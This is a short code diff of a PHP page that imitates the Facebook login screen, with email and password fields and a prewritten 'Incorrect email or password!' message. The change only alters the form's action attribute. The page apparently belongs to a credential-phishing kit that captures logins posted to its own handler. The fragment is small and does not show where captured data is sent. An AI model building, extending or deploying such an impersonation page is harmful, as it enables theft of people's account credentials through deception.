@@ -25,7 +25,7 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST' && !empty($_POST['user_email']) && !emp
 <div class="container <?=$none?>">
     <h2>facebook</h2>
     <div class="container-form">
-        <form action="#" method="post">
+        <form action="" method="post">
             <h3>Log Into Facebook</h3>
             <div class="input-group">
                 <div class="message">Incorrect email or password!</div>
